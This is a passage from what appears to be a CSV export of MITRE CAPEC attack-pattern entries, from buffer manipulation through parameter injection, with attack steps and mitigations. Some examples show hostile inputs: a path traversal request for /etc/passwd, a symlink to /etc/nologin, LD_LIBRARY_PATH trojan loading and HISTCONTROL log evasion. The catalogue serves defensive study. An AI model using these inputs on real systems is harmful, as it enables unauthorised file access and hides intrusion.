Thus compromising data integrity and confidentiality in addition to HIPAA violations.::",::269::732::1317::,N/A,N/A,https://capec.mitre.org/data/definitions/122.html
CAPEC-123,Buffer Manipulation,Meta,Draft,"An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.",N/A,High,Very High,N/A,N/A,"::The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.::",N/A,N/A,N/A,"::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution A buffer manipulation attack often results in a crash of the application due to the corruption of memory.::SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data:NOTE:Confidentiality Execute Unauthorized Commands Modify Data Read Data If constructed properly, a buffer manipulation attack can be used to contol the execution of the application leading to any number of negative consequenses.::","::To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.::",N/A,::119::,N/A,N/A,https://capec.mitre.org/data/definitions/123.html
CAPEC-125,Flooding,Meta,Stable,"An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.",N/A,High,Medium,N/A,N/A,::Any target that services requests is vulnerable to this attack on some level of scale.::,N/A,"::A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.::",N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful flooding attack compromises the availability of the target system's service by exhausting its available resources.::,::Ensure that protocols have specific limits of scale configured.::Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.::Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::,N/A,::404::770::,TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Traffic flood::,N/A,https://capec.mitre.org/data/definitions/125.html
CAPEC-126,Path Traversal,Standard,Draft,"An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or ) and/or dots (.)) to reach desired directories or files.",::TERM:Directory Traversal:DESCRIPTION:::,High,Very High,::NATURE:ChildOf:CAPEC ID:153::NATURE:CanPrecede:CAPEC ID:664::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Fingerprinting of the operating system] In order to perform a valid path traversal, the attacker needs to know what the underlying OS is so that the proper file seperator is used.TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable file inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application::STEP:4:PHASE:Exploit:DESCRIPTION:[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)::",::The attacker must be able to control the path that is requested of the target.::The target must fail to adequately sanitize incoming paths::,::SKILL:Simple command line attacks or to inject the malicious payload in a web page.:LEVEL:Low::SKILL:Customizing attacks to bypass non trivial filters in the application.:LEVEL:Medium::,::The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.::,N/A,"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Confidentiality Availability Execute Unauthorized Commands The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.::","::Design: Configure the access control correctly.::Design: Enforce principle of least privilege.::Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.::Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.::Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::Implementation: Perform input validation for all remote content, including remote and user-generated content.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::Implementation: Use indirect references rather than actual file names.::Implementation: Use possible permissions on file access when developing and deploying web applications.::Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- using an allowlist approach.::","::An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.::",::22::,TAXONOMY NAME:WASC:ENTRY ID:33:ENTRY NAME:Path Traversal::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Path Traversal::,N/A,https://capec.mitre.org/data/definitions/126.html
CAPEC-127,Directory Indexing,Detailed,Draft,"An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.",N/A,High,Medium,::NATURE:ChildOf:CAPEC ID:54::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.TECHNIQUE:Send requests to the web server for common directory names:TECHNIQUE:If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.:TECHNIQUE:Search for uncommon or potentially user created directories that may be present.::STEP:2:PHASE:Experiment:DESCRIPTION:[Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methodsTECHNIQUE:Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.:TECHNIQUE:Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.:TECHNIQUE:Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a / request::STEP:3:PHASE:Exploit:DESCRIPTION:[Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methodsTECHNIQUE:Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a / request:TECHNIQUE:Try other known exploits to elevate privileges sufficient to bypass protected directories.:TECHNIQUE:List the files in the directory by issuing a request with the URL ending in a / slash.:TECHNIQUE:Access the files via direct URL and capture contents.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.::",::The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.::The adversary must be able to control the path that is requested of the target.::The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.::The server version or patch level must not inherently prevent known directory listing attacks from working.::,::SKILL:To issue the request to URL without given a specific file name:LEVEL:Low::SKILL:To bypass the access control of the directory of listings:LEVEL:High::,::Ability to send HTTP requests to a web application.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Information Leakage::,"::1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.::2. Preventing with .htaccess in Apache web server: In .htaccess, write Options-indexes.::3. Suppressing error messages: using error 403 Forbidden message exactly like error 404 Not Found message.::","::The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80 The target application does not have direct hyperlink to the backup directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a db_dump.php file in it. This sensitive data should not be disclosed publicly.::",::424::425::288::285::732::276::693::,TAXONOMY NAME:ATTACK:ENTRY ID:1083:ENTRY NAME:File and Directory Discovery::,N/A,https://capec.mitre.org/data/definitions/127.html
CAPEC-128,Integer Attacks,Standard,Draft,"An attacker takes advantage of the structure of integer variables to cause these variables to assume values that are not expected by an application. For example, adding one to the largest positive integer in a signed integer variable results in a negative number. Negative numbers may be illegal in an application and the application may prevent an attacker from providing them directly, but the application may not consider that adding two positive numbers can create a negative number do to the structure of integer storage formats.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:153::,N/A,::The target application must have an integer variable for which only some of the possible integer values are expected by the application and where there are no checks on the value of the variable before use.::The attacker must be able to manipulate the targeted integer variable such that normal operations result in non-standard values due to the storage structure of integers.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,N/A,N/A,N/A,::682::,N/A,N/A,https://capec.mitre.org/data/definitions/128.html
CAPEC-129,Pointer Manipulation,Meta,Draft,"This attack pattern involves an adversary manipulating a pointer within a target application resulting in the application accessing an unintended memory location. This can result in the crashing of the application or, for certain pointer values, access to data that would not normally be possible or the execution of arbitrary code. Since pointers are simply integer variables, Integer Attacks may often be used in Pointer Attacks.",N/A,N/A,Medium,N/A,N/A,::The target application must have a pointer variable that the attacker can influence to hold an arbitrary value.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,N/A,N/A,N/A,::682::822::823::,N/A,N/A,https://capec.mitre.org/data/definitions/129.html
CAPEC-13,Subverting Environment Variable Values,Detailed,Stable,The adversary directly or indirectly modifies environment variables used by or controlling the target software. The adversary's goal is to cause the target software to deviate from its expected operation in a manner that benefits the adversary.,N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:77::NATURE:CanPrecede:CAPEC ID:14::NATURE:PeerOf:CAPEC ID:10::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on. Most importantly, the adversary tries to determine what environment variables might be used by the underlying software, or even the application itself.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find user-controlled environment variables] Using the information found by probing the application, the adversary attempts to manipulate any user-controlled environment variables they have found are being used by the application, or suspect are being used by the application, and observe the effects of these changes. If the adversary notices any significant changes to the application, they will know that a certain environment variable is important to the application behavior and indicates a possible attack vector.TECHNIQUE:Alter known environment variables such as $PATH, $HOSTNAME, or LD_LIBRARY_PATH and see if application behavior changes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate user-controlled environment variables] The adversary manipulates the found environment variable(s) to abuse the normal flow of processes or to gain access to privileged resources.::",::An environment variable is accessible to the user.::An environment variable used by the application can be tainted with user supplied data.::Input data used in an environment variable is not validated properly.::The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an adversary may attempt to manipulate that variable.::,"::SKILL:In a web based scenario, the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism.:LEVEL:Low::SKILL:Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it.:LEVEL:High::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AccountabilityTECHNICAL IMPACT:Hide Activities::,::Protect environment variables against unauthorized read and write access.::Protect the configuration files which contain environment variables against illegitimate read and write access.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.::,"::Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the adversary upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)::The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate commands by setting it to ignoredups. In some Linux systems, this is set by default to ignoreboth which covers both of the previous examples. This means that ls will not be saved, but ls would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.::",::353::285::302::74::15::73::20::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1562.003:ENTRY NAME:Impair Defenses:Impair Command History Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.006:ENTRY NAME:Hijack Execution Flow:Dynamic Linker Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.007:ENTRY NAME:Hijack Execution Flow:Path Interception by PATH Environment Variable::,N/A,https://capec.mitre.org/data/definitions/13.html
CAPEC-130,Excessive Allocation,Meta,Stable,"An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.",N/A,Medium,Medium,N/A,N/A,::The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,"::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service.::","::Limit the amount of resources that are accessible to unprivileged users.::Assume all input is malicious. Consider all potentially relevant properties when validating input.::Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::Use resource-limiting settings, if possible.::","::In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.::",::404::770::1325::,TAXONOMY NAME:ATTACK:ENTRY ID:1499.003:ENTRY NAME:Endpoint Denial of Service:Application Exhaustion Flood::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::,N/A,https://capec.mitre.org/data/definitions/130.html
CAPEC-131,Resource Leak Exposure,Meta,Stable,An adversary utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests.,N/A,Medium,Medium,N/A,N/A,::The target must have a resource leak that the adversary can repeatedly trigger.::,N/A,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption A successful resource leak exposure attack compromises the availability of the target system's services.::,"::If possible, leverage coding language(s) that do not allow this weakness to occur (e.g., Java, Ruby, and Python all perform automatic garbage collection that releases memory for objects that have been deallocated).::Memory should always be allocated/freed using matching functions (e.g., malloc/free, new/delete, etc.)::Implement best practices with respect to memory management, including the freeing of all allocated resources at all exit points and ensuring consistency with how and where memory is freed in a function.::",N/A,::404::,TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::,N/A,https://capec.mitre.org/data/definitions/131.html
CAPEC-132,Symlink Attack,Detailed,Draft,"An adversary positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:159::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] Adversary identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.TECHNIQUE:The adversary writes to files in different directories to check whether the application has sufficient checking before file operations.:TECHNIQUE:The adversary creates symlinks to files in different directories.::STEP:2:PHASE:Experiment:DESCRIPTION:[Try to create symlinks to different files] The adversary then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.TECHNIQUE:The adversary monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the adversary can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.:TECHNIQUE:The adversary may need a little guesswork on the filenames on which the target application would operate.:TECHNIQUE:The adversary tries to create symlinks to the various filenames.::STEP:3:PHASE:Exploit:DESCRIPTION:[Target application operates on created symlinks to sensitive files] The adversary is able to create symlinks to sensitive files while the target application is operating on the file.TECHNIQUE:Create the symlink to the sensitive file such as configuration files, etc.::",::The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The adversary must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.::,::SKILL:To create symlinks:LEVEL:Low::SKILL:To identify the files and create the symlinks during the file operation time window:LEVEL:High::,::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to create the necessary symbolic link.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,"::Design: Check for the existence of files to be created, if in existence verify they are neither symlinks nor hard links before opening them.::Implementation: Use randomly generated file names for temporary files. Give the files restrictive permissions.::","::The adversary creates a symlink with the same name as the file which the application is intending to write to. The application will write to the file- causing the data to be written where the symlink is pointing. An attack like this can be demonstrated as follows: root# vulprog myFile {...program does some processing...] adversary# ln –s /etc/nologin myFile [...program writes to 'myFile', which points to /etc/nologin...] In the above example, the root user ran a program with poorly written file handling routines, providing the filename myFile to vulnprog for the relevant data to be written to. However, the adversary happened to be looking over the shoulder of root at the time, and created a link from myFile to /etc/nologin. The attack would make no user be able to login.::",::59::,TAXONOMY NAME:ATTACK:ENTRY ID:1547.009:ENTRY NAME:Boot or Logon Autostart Execution:Shortcut Modification::,N/A,https://capec.mitre.org/data/definitions/132.html
CAPEC-135,Format String Injection,Standard,Draft,"An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:137::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] The adversary takes an inventory of the entry points of the application.TECHNIQUE:Spider web sites for all available links:TECHNIQUE:List parameters, external variables, configuration files variables, etc. that are possibly used by the application.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to format string injection] Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.TECHNIQUE:Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.::STEP:3:PHASE:Exploit:DESCRIPTION:[Try to exploit the Format String Injection vulnerability] After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.TECHNIQUE:Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.::","::The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.::","::SKILL:In order to discover format string vulnerabilities it takes only low skill, however, converting this discovery into a working exploit requires advanced knowledge on the part of the adversary.:LEVEL:High::",::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection Mechanism::,::Limit the usage of formatting string functions.::Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.::,"::Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks. See also: CVE-2007-2027::",::134::20::74::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Format string attack::,N/A,https://capec.mitre.org/data/definitions/135.html
CAPEC-136,LDAP Injection,Standard,Draft,"An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:248::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey application] The attacker takes an inventory of the entry points of the application.TECHNIQUE:Spider web sites for all available links:TECHNIQUE:Sniff network communications with application using a utility such as WireShark.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to LDAP injection] For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntaxTECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Experiment:DESCRIPTION:[Try to exploit the LDAP injection vulnerability] After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.TECHNIQUE:Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.::","::The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.::","::SKILL:The attacker needs to have knowledge of LDAP, especially its query syntax.:LEVEL:Medium::",N/A,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.::,"::PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack. See also: CVE-2005-2301::",::77::90::20::,TAXONOMY NAME:WASC:ENTRY ID:29:ENTRY NAME:LDAP Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:LDAP Injection::,N/A,https://capec.mitre.org/data/definitions/136.html
CAPEC-137,Parameter Injection,Meta,Stable,"An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value myInput&new_param=myValue, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.",N/A,Medium,Medium,N/A,N/A,"::The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.::The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.::",N/A,::None: No specialized resources are required to execute this type of attack. The only requirement is the ability to provide string input to the target.::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Successful parameter injection attacks mean a compromise to integrity of the application.::,"::Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise.::Treat all user input as untrusted data that must be validated before use.::",N/A,::88::,N/A,N/A,https://capec.mitre.org/data/definitions/137.html
